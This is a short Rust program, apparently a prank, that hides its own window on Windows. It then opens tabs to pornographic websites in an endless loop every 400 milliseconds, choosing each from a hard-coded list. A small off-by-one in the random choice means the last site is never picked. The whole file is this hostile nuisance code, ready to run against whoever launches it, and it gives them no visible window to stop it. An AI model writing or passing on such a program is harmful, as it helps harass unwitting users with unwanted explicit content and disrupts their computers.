// This hides the window on startup
// Widows only!
#![windows_subsystem = "windows"]

use rand::{thread_rng, Rng};
use std::{thread, time};

fn main() {
    let delay = time::Duration::from_millis(400);
    let mut rng = thread_rng();

    let targets: [&str; 5] = [
        "https://pornhub.com",
        "https://pornhub.com/gayporn",
        "https://e621.net",
        "https://xvideos.com",
        "https://rule43.xxx",
    ];

    loop {
        let target = targets[rng.gen_range(0..(targets.len() - 1))];

        if let Err(e) = open_tab(target) {
            println!("{:#?}", e);
            panic!("Failed to execute program!");
        }
        thread::sleep(delay);
    }
}

fn open_tab(url: &str) -> Result<(), std::io::Error> {
    webbrowser::open(&url)
}
